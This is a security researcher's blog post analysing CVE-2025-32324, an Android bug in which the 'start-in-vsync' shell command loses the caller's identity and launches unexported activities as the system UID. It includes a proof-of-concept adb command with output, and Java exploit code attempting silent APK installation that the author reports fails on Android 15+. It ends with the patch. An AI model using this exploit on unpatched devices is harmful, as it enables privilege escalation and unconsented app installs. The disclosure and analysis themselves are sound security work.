<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CVE-2025-32324: Android ActivityManagerShellCommand Authentication Bypass Leading to LaunchAnyWhere | CyFun</title><meta name=keywords content="android,vulnerability,cve,authentication-bypass,privilege-escalation,system-security"><meta name=description content="Deep analysis of CVE-2025-32324, a critical authentication bypass vulnerability in Android&rsquo;s ActivityManagerShellCommand that enables LaunchAnyWhere attacks through thread context manipulation."><meta name=author content><link rel=canonical href=https://s4ch.github.io/research/cve-2025-32324/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/research/cve-2025-32324/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="CVE-2025-32324: Android ActivityManagerShellCommand Authentication Bypass Leading to LaunchAnyWhere"><meta property="og:description" content="Deep analysis of CVE-2025-32324, a critical authentication bypass vulnerability in Android&rsquo;s ActivityManagerShellCommand that enables LaunchAnyWhere attacks through thread context manipulation."><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/research/cve-2025-32324/"><meta property="article:section" content="research"><meta property="article:published_time" content="2025-09-30T06:30:05+00:00"><meta property="article:modified_time" content="2025-09-30T13:22:21+05:30"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2025-32324: Android ActivityManagerShellCommand Authentication Bypass Leading to LaunchAnyWhere"><meta name=twitter:description content="Deep analysis of CVE-2025-32324, a critical authentication bypass vulnerability in Android&rsquo;s ActivityManagerShellCommand that enables LaunchAnyWhere attacks through thread context manipulation."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Research","item":"https://s4ch.github.io/research/"},{"@type":"ListItem","position":2,"name":"CVE-2025-32324: Android ActivityManagerShellCommand Authentication Bypass Leading to LaunchAnyWhere","item":"https://s4ch.github.io/research/cve-2025-32324/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2025-32324: Android ActivityManagerShellCommand Authentication Bypass Leading to LaunchAnyWhere","name":"CVE-2025-32324: Android ActivityManagerShellCommand Authentication Bypass Leading to LaunchAnyWhere","description":"Deep analysis of CVE-2025-32324, a critical authentication bypass vulnerability in Android\u0026rsquo;s ActivityManagerShellCommand that enables LaunchAnyWhere attacks through thread context manipulation.","keywords":["android","vulnerability","cve","authentication-bypass","privilege-escalation","system-security"],"articleBody":" Disclaimer: This research is conducted independently during my personal time as an open-source security researcher. The views and findings presented here are my own and do not represent or reflect the opinions of my current employer or any affiliated organizations.\nDuring my recent research into Android’s activity management subsystem, I discovered a critical authentication bypass vulnerability in the ActivityManagerShellCommand’s start-in-vsync command. This flaw allows attackers to achieve LaunchAnyWhere capability, enabling the launch of arbitrary unexported Activities within the system. This behavior should normally be restricted by Android’s security model.\nIntroduction While reverse engineering Android’s ActivityManager implementation, I stumbled upon an interesting discrepancy in how the start-in-vsync command handles authentication context compared to the standard start-activity command. What initially seemed like a minor implementation detail turned out to be a significant security vulnerability that completely bypasses Android’s activity export restrictions.\nThe root cause lies in how authentication information gets lost during inter-thread communication via Android’s Handler mechanism. This seemingly innocent architectural choice creates a powerful LaunchAnyWhere primitive that can be exploited to invoke any unexported Activity in the system.\nVulnerability Analysis Let me walk you through the vulnerable code. At first glance, it appears straightforward:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // the normal path: straightforward and secure case \"start\": case \"start-activity\": return runStartActivity(pw); // executes directly in current thread // the problematic path where things get interesting case \"start-in-vsync\": final ProgressWaiter waiter = new ProgressWaiter(0); final int[] startResult = new int[1]; startResult[0] = -1; // here's the bug: we're jumping to the UI thread via Handler mInternal.mUiHandler.runWithScissors( () -\u003e Choreographer.getInstance().postFrameCallback(frameTimeNanos -\u003e { try { // this call happens in a different thread context! // binder auth info from original caller is lost here startResult[0] = runStartActivity(pw); waiter.onFinished(0, null /* extras */); } catch (Exception ex) { getErrPrintWriter().println( \"Error: unable to start activity, \" + ex); } }), USER_OPERATION_TIMEOUT_MS / 2); waiter.waitForFinish(USER_OPERATION_TIMEOUT_MS); return startResult[0]; // return whatever happened in that other thread The crucial difference between start-activity and start-in-vsync becomes apparent when you examine the execution flow. While start-activity executes runStartActivity directly in the current thread, start-in-vsync delegates this execution to ATMS’s mUiHandler thread via a frame callback.\nHere’s where the magic (and the bug) happens: when Android’s Handler mechanism transfers execution between threads, the Binder authentication context doesn’t follow along. This means that runStartActivity executed in the UI handler thread sees the authentication credentials of the system_server process (UID 1000) rather than the original caller.\nI verified this behavior by adding some debug logging to trace the UID transitions:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // let's add some debug logging to see what's really happening case \"start\": case \"start-activity\": // this should show our shell UID (2000) pw.println(\"Direct call - UID: \" + Binder.getCallingUid() + \", PID: \" + Binder.getCallingPid()); return runStartActivity(pw); case \"start-in-vsync\": final ProgressWaiter waiter = new ProgressWaiter(0); final int[] startResult = new int[1]; startResult[0] = -1; mInternal.mUiHandler.runWithScissors( () -\u003e Choreographer.getInstance().postFrameCallback(frameTimeNanos -\u003e { try { // watch the magic happen: this will show system_server UID (1000)! pw.println(\"Handler call - UID: \" + Binder.getCallingUid() + \", PID: \" + Binder.getCallingPid()); startResult[0] = runStartActivity(pw); waiter.onFinished(0, null /* extras */); } catch (Exception ex) { getErrPrintWriter().println( \"Error: unable to start activity, \" + ex); } }), USER_OPERATION_TIMEOUT_MS / 2); waiter.waitForFinish(USER_OPERATION_TIMEOUT_MS); return startResult[0]; Proof of Concept The authentication bypass becomes crystal clear when you compare the behavior of both commands side by side:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ adb shell am start -n com.android.settings/.SubSettings In AMSC.onCommand: callingUid=2000, callingPid=3873 Starting: Intent { cmp=com.android.settings/.SubSettings } Exception occurred while executing 'start': java.lang.SecurityException: Permission Denial: starting Intent { flg=0x10000000 cmp=com.android.settings/.SubSettings } from null (pid=3873, uid=2000) not exported from uid 1000 at com.android.server.wm.ActivityTaskSupervisor.checkStartAnyActivityPermission(ActivityTaskSupervisor.java:1184) at com.android.server.wm.ActivityStarter.executeRequest(ActivityStarter.java:1223) at com.android.server.wm.ActivityStarter.execute(ActivityStarter.java:865) at com.android.server.wm.ActivityTaskManagerService.startActivityAsUser(ActivityTaskManagerService.java:1321) at com.android.server.wm.ActivityTaskManagerService.startActivityAsUser(ActivityTaskManagerService.java:1262) at com.android.server.am.ActivityManagerService.startActivityAsUserWithFeature(ActivityManagerService.java:3245) at com.android.server.am.ActivityManagerShellCommand.runStartActivity(ActivityManagerShellCommand.java:869) at com.android.server.am.ActivityManagerShellCommand.onCommand(ActivityManagerShellCommand.java:251) at com.android.modules.utils.BasicShellCommandHandler.exec(BasicShellCommandHandler.java:97) at android.os.ShellCommand.exec(ShellCommand.java:38) at com.android.server.am.ActivityManagerService.onShellCommand(ActivityManagerService.java:10406) at android.os.Binder.shellCommand(Binder.java:1143) at android.os.Binder.onTransact(Binder.java:945) at android.app.IActivityManager$Stub.onTransact(IActivityManager.java:5733) at com.android.server.am.ActivityManagerService.onTransact(ActivityManagerService.java:2721) at android.os.Binder.execTransactInternal(Binder.java:1411) at android.os.Binder.execTransact(Binder.java:1350) $ adb shell am start-in-vsync -n com.android.settings/.SubSettings In AMSC.onCommand: callingUid=2000, callingPid=3914 In ATMS.mUiHandler: callingUid=1000, callingPid=1306 Starting: Intent { cmp=com.android.settings/.SubSettings } The output speaks for itself: notice how the calling UID changes from 2000 (shell) to 1000 (system) when using start-in-vsync. This UID elevation enables the LaunchAnyWhere attack, as activities that would normally reject our shell-level access now see us as the trusted system server.\nLimitations and Attack Surface While this vulnerability is certainly interesting, it comes with some significant constraints that limit its practical exploitation potential. The most important limitation is that this flaw only exists within the ActivityManagerShellCommand interface. You can’t trigger it through standard ATMS Binder IPC calls.\nThis means attackers are restricted to using the am command-line utility, which significantly limits the types of parameters that can be passed to target activities. Specifically, you cannot include arbitrary Parcelable objects in the Intent, which rules out many advanced exploitation techniques that rely on complex data structures.\nThis parameter restriction is particularly limiting because it prevents chaining this vulnerability with Intent Bridge attacks against third-party applications (UID \u003e 10000) to access their FileProviders, which is a common technique in Android exploitation.\nExploitation Attempts Silent Installation Attack My first instinct was to weaponize this vulnerability for silent APK installation by targeting the PackageInstaller’s InstallInstalling activity. The theory was sound: if I could launch this normally-protected activity with system-level privileges, I might be able to bypass the user confirmation dialogs.\nI crafted the following exploitation approach:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 public static int writeApkToPackageInstaller(Context context, File apkFile) throws IOException { if (!apkFile.exists() || !apkFile.getName().endsWith(\".apk\")) { Log.e(TAG, \"Must use an apk file to silent install.\"); return -1; } // step 1: create a PackageInstaller session (this part works fine) PackageInstaller pi = context.getPackageManager().getPackageInstaller(); PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL); int sessionId = pi.createSession(params); PackageInstaller.Session session = pi.openSession(sessionId); // step 2: stream the APK data into the session OutputStream os = session.openWrite(\"package\", 0, -1); FileInputStream fis = new FileInputStream(apkFile); byte[] buffer = new byte[4096]; for (int n; (n = fis.read(buffer)) \u003e 0;) { os.write(buffer, 0, n); // push APK bytes into the installer } fis.close(); os.flush(); os.close(); return sessionId; // return the session ID for later use } public static void exploitCVE_2025_32324(int sessionId, File apkFile) throws IOException { if (!Android.checkIfSecurityPatchBefore(\"2025-09-01\")) { Log.e(TAG, \"Oops! It looks like CVE-2025-32324 bug has been fixed on this device.\"); return; } // here's the magic: use start-in-vsync to bypass activity export restrictions String[] cmd = { \"am\", \"start-in-vsync\", // the vulnerable command that loses auth context \"-n\", Constants.Package.PACKAGE_INSTALLER + \"/.InstallInstalling\", \"-d\", Uri.fromFile(apkFile).toString(), // point to our APK \"--ei\", \"EXTRA_STAGED_SESSION_ID\", Integer.toString(sessionId), // link to session }; // fire off the exploit and hope for the best Process p = Runtime.getRuntime().exec(cmd); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String output; while ((output = reader.readLine()) != null) { Log.d(TAG, output); // see what happens } } public static void autoInstallFromAsset(Context context, String asset) throws IOException { // step 1: extract our payload APK from app assets File apkFile = new File(context.getCacheDir(), asset); Android.copyAsset(context, asset, apkFile); // step 2: set up the PackageInstaller session int sessionId = AndroidH.writeApkToPackageInstaller(context, apkFile); // step 3: copy to Downloads so PackageInstaller can access it // (this creates a duplicate but it's necessary for the file URI) Android.copyFileToDownload(context, apkFile, apkFile.getName(), \"application/vnd.android.package-archive\"); // step 4: launch the exploit! // we use file:// URI because when executed as UID 1000, // FileUriExposedException restrictions don't apply to us File apkFileInDownload = new File(Environment .getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), apkFile.getName()); exploitCVE_2025_32324(sessionId, apkFileInDownload); } Unfortunately, this approach hit a roadblock. The InstallInstalling activity expects an ApplicationInfo object as a parameter, which cannot be serialized and passed through the command line interface:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public static Intent createInstallingIntent(Context context, int sessionId, File apkFile) { // this is how we WOULD construct the Intent if we had proper API access Intent installingIntent = new Intent(); installingIntent.setClassName(Constants.Package.PACKAGE_INSTALLER, Constants.Package.PACKAGE_INSTALLER + \".InstallInstalling\"); installingIntent.putExtra(\"EXTRA_STAGED_SESSION_ID\", sessionId); installingIntent.setData(Uri.fromFile(apkFile)); // extract package info from the APK file PackageInfo packageInfo = context.getPackageManager() .getPackageArchiveInfo(apkFile.getAbsolutePath(), PackageManager.GET_PERMISSIONS); if (packageInfo == null) { Log.e(TAG, \"getPackageArchiveInfo returns null, failed to auto install.\"); return null; } installingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // hERE'S THE PROBLEM: this complex object can't be serialized via command line! // the 'am' command has no way to pass this ApplicationInfo structure installingIntent.putExtra(\"com.android.packageinstaller.applicationInfo\", packageInfo.applicationInfo); return installingIntent; } The Android 15+ Roadblock What made this particularly frustrating was that this attack vector would have worked in Android 14 and earlier! In older versions, the missing ApplicationInfo object would cause UI display issues but wouldn’t prevent the actual installation from proceeding in the background.\nHowever, Google introduced a change that completely broke this exploitation path:\n1 2 3 4 5 6 7 - PackageUtil.AppSnippet as = getIntent() - .getParcelableExtra(EXTRA_APP_SNIPPET, PackageUtil.AppSnippet.class); + + // Dialogs displayed while changing update-owner have a blank icon. To fix this, + // fetch the appSnippet from the source file again + PackageUtil.AppSnippet as = PackageUtil.getAppSnippet(this, appInfo, sourceFile); + getIntent().putExtra(EXTRA_APP_SNIPPET, as); This change moved the ApplicationInfo dependency much earlier in the execution flow. Instead of the appInfo object being used only after installation begins, the new code immediately calls PackageUtil.getAppSnippet during activity creation, which heavily depends on appInfo being non-null:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 /** * this is the method that kills our exploitation attempt. * it expects a fully populated ApplicationInfo object, which we can't provide. */ public static AppSnippet getAppSnippet( Activity pContext, ApplicationInfo appInfo, File sourceFile) { final String archiveFilePath = sourceFile.getAbsolutePath(); PackageManager pm = pContext.getPackageManager(); // BOOM! this line crashes with NPE when appInfo is null appInfo.publicSourceDir = archiveFilePath; // NullPointerException here! // handle split APKs (we never get this far with null appInfo) if (appInfo.splitNames != null \u0026\u0026 appInfo.splitSourceDirs == null) { final File[] files = sourceFile.getParentFile().listFiles( (dir, name) -\u003e name.endsWith(SPLIT_APK_SUFFIX)); final String[] splits = Arrays.stream(appInfo.splitNames) .map(i -\u003e findFilePath(files, i + SPLIT_APK_SUFFIX)) .filter(Objects::nonNull) .toArray(String[]::new); appInfo.splitSourceDirs = splits; appInfo.splitPublicSourceDirs = splits; } // extract app label from resources CharSequence label = null; if (appInfo.labelRes != 0) { try { label = appInfo.loadLabel(pm); // more NPE potential here } catch (Resources.NotFoundException e) { // fail silently } } if (label == null) { label = (appInfo.nonLocalizedLabel != null) ? appInfo.nonLocalizedLabel : appInfo.packageName; } // load app icon Drawable icon = null; try { if (appInfo.icon != 0) { try { icon = appInfo.loadIcon(pm); // and here too } catch (Resources.NotFoundException e) { // icon not found, use default } } if (icon == null) { icon = pContext.getPackageManager().getDefaultActivityIcon(); } } catch (OutOfMemoryError e) { Log.i(LOG_TAG, \"Could not load app icon\", e); } return new PackageUtil.AppSnippet(label, icon, pContext); } My testing confirmed this roadblock: the moment PackageUtil.getAppSnippet tries to access appInfo.publicSourceDir, a NullPointerException crashes the entire PackageInstaller process:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 E FATAL EXCEPTION: main Process: com.android.packageinstaller, PID: 31447 java.lang.RuntimeException: Unable to start activity ComponentInfo{com.android.packageinstaller/com.android.packageinstaller.InstallInstalling}: java.lang.NullPointerException: Attempt to write to field 'java.lang.String android.content.pm.ApplicationInfo.publicSourceDir' on a null object reference in method 'com.android.packageinstaller.PackageUtil$AppSnippet com.android.packageinstaller.PackageUtil.getAppSnippet(android.app.Activity, android.content.pm.ApplicationInfo, java.io.File)' at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4206) at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4393) at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:222) at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133) at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103) at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80) at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2773) at android.os.Handler.dispatchMessage(Handler.java:109) at android.os.Looper.loopOnce(Looper.java:232) at android.os.Looper.loop(Looper.java:317) at android.app.ActivityThread.main(ActivityThread.java:8934) at java.lang.reflect.Method.invoke(Native Method) at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:591) at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:911) Caused by: java.lang.NullPointerException: Attempt to write to field 'java.lang.String android.content.pm.ApplicationInfo.publicSourceDir' on a null object reference in method 'com.android.packageinstaller.PackageUtil$AppSnippet com.android.packageinstaller.PackageUtil.getAppSnippet(android.app.Activity, android.content.pm.ApplicationInfo, java.io.File)' at com.android.packageinstaller.PackageUtil.getAppSnippet(PackageUtil.java:240) at com.android.packageinstaller.InstallInstalling.onCreate(InstallInstalling.java:99) at android.app.Activity.performCreate(Activity.java:9079) at android.app.Activity.performCreate(Activity.java:9057) at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1531) at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4188) at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4393) at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:222) at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133) at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103) at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80) at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2773) at android.os.Handler.dispatchMessage(Handler.java:109) at android.os.Looper.loopOnce(Looper.java:232) at android.os.Looper.loop(Looper.java:317) at android.app.ActivityThread.main(ActivityThread.java:8934) at java.lang.reflect.Method.invoke(Native Method) at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:591) at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:911) The Fix Google eventually addressed this vulnerability with a straightforward fix that eliminates the problematic thread transition. Here’s the patch that landed in the Android source tree:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 @@ -250,21 +250,13 @@ return runStartActivity(pw); case \"start-in-vsync\": final ProgressWaiter waiter = new ProgressWaiter(0); - final int[] startResult = new int[1]; // remove complex result passing - startResult[0] = -1; mInternal.mUiHandler.runWithScissors( () -\u003e Choreographer.getInstance().postFrameCallback(frameTimeNanos -\u003e { - try { - startResult[0] = runStartActivity(pw); // OLD: execute in handler thread - waiter.onFinished(0, null /* extras */); - } catch (Exception ex) { - getErrPrintWriter().println( - \"Error: unable to start activity, \" + ex); - } + waiter.onFinished(0, null /* extras */); // NEW: just sync timing }), USER_OPERATION_TIMEOUT_MS / 2); waiter.waitForFinish(USER_OPERATION_TIMEOUT_MS); - return startResult[0]; // OLD: return cross-thread result + return runStartActivity(pw); // NEW: execute in original thread! The fix is elegant in its simplicity: instead of executing runStartActivity inside the frame callback (where authentication context is lost), the patched code only uses the frame callback for timing synchronization, then executes runStartActivity in the original thread context where authentication information is preserved.\nThis change maintains the intended vsync timing behavior while completely eliminating the authentication bypass vector.\nFinal Words CVE-2025-32324 demonstrates how small implementation details can create significant security flaws: a few lines of code difference between start-activity and start-in-vsync caused authentication context to be lost during thread transitions. Despite achieving complete authentication bypass, Android’s layered security model and rapid patching cycles limited the practical exploitation window.\nThis vulnerability shows that modern Android security issues are often logical flaws in system design rather than traditional memory corruption bugs. Understanding how different components interact is as important as finding the initial bug.\nGoogle’s fix was straightforward: they kept the timing synchronization in the background thread but moved the actual security-sensitive operation back to the original thread where authentication context is preserved.\nThe lesson: when debugging Android security, always verify which thread your code runs in and what permissions that thread actually has.\nReferences: Android Source Commit - Fix starting activity with incorrect pid/uid Android Security Bulletin Information ","wordCount":"2465","inLanguage":"en","datePublished":"2025-09-30T06:30:05Z","dateModified":"2025-09-30T13:22:21+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/research/cve-2025-32324/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">CVE-2025-32324: Android ActivityManagerShellCommand Authentication Bypass Leading to LaunchAnyWhere</h1><div class=post-meta><span title='2025-09-30 06:30:05 +0000 UTC'>September 30, 2025</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2465 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/android/ class=post-tag title=android>android</a>
,
<a href=https://s4ch.github.io/tags/vulnerability/ class=post-tag title=vulnerability>vulnerability</a>
,
<a href=https://s4ch.github.io/tags/cve/ class=post-tag title=cve>cve</a>
,
<a href=https://s4ch.github.io/tags/authentication-bypass/ class=post-tag title=authentication-bypass>authentication-bypass</a>
,
<a href=https://s4ch.github.io/tags/privilege-escalation/ class=post-tag title=privilege-escalation>privilege-escalation</a>
,
<a href=https://s4ch.github.io/tags/system-security/ class=post-tag title=system-security>system-security</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/research/ class=post-tag title=research>research</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#vulnerability-analysis>Vulnerability Analysis</a></li><li><a href=#proof-of-concept>Proof of Concept</a></li><li><a href=#limitations-and-attack-surface>Limitations and Attack Surface</a></li><li><a href=#exploitation-attempts>Exploitation Attempts</a><ul><li><a href=#silent-installation-attack>Silent Installation Attack</a></li><li><a href=#the-android-15-roadblock>The Android 15+ Roadblock</a></li></ul></li><li><a href=#the-fix>The Fix</a></li><li><a href=#final-words>Final Words</a></li><li><a href=#references>References:</a></li></ul></nav></div></details></div><div class=post-content><blockquote><p><strong>Disclaimer</strong>: This research is conducted independently during my personal time as an open-source security researcher. The views and findings presented here are my own and do not represent or reflect the opinions of my current employer or any affiliated organizations.</p></blockquote><hr><p>During my recent research into Android&rsquo;s activity management subsystem, I discovered a critical authentication bypass vulnerability in the ActivityManagerShellCommand&rsquo;s <code>start-in-vsync</code> command. This flaw allows attackers to achieve LaunchAnyWhere capability, enabling the launch of arbitrary unexported Activities within the system. This behavior should normally be restricted by Android&rsquo;s security model.</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>While reverse engineering Android&rsquo;s ActivityManager implementation, I stumbled upon an interesting discrepancy in how the <code>start-in-vsync</code> command handles authentication context compared to the standard <code>start-activity</code> command. What initially seemed like a minor implementation detail turned out to be a significant security vulnerability that completely bypasses Android&rsquo;s activity export restrictions.</p><p>The root cause lies in how authentication information gets lost during inter-thread communication via Android&rsquo;s Handler mechanism. This seemingly innocent architectural choice creates a powerful LaunchAnyWhere primitive that can be exploited to invoke any unexported Activity in the system.</p><h2 id=vulnerability-analysis>Vulnerability Analysis<a hidden class=anchor aria-hidden=true href=#vulnerability-analysis>#</a></h2><p>Let me walk you through the vulnerable code. At first glance, it appears straightforward:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// the normal path: straightforward and secure</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>case</span><span class=w> </span><span class=s>&#34;start&#34;</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>case</span><span class=w> </span><span class=s>&#34;start-activity&#34;</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>runStartActivity</span><span class=p>(</span><span class=n>pw</span><span class=p>);</span><span class=w>  </span><span class=c1>// executes directly in current thread</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// the problematic path where things get interesting</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>case</span><span class=w> </span><span class=s>&#34;start-in-vsync&#34;</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>final</span><span class=w> </span><span class=n>ProgressWaiter</span><span class=w> </span><span class=n>waiter</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ProgressWaiter</span><span class=p>(</span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=o>[]</span><span class=w> </span><span class=n>startResult</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>int</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>startResult</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>-</span><span class=n>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// here&#39;s the bug: we&#39;re jumping to the UI thread via Handler</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mInternal</span><span class=p>.</span><span class=na>mUiHandler</span><span class=p>.</span><span class=na>runWithScissors</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>()</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>Choreographer</span><span class=p>.</span><span class=na>getInstance</span><span class=p>().</span><span class=na>postFrameCallback</span><span class=p>(</span><span class=n>frameTimeNanos</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
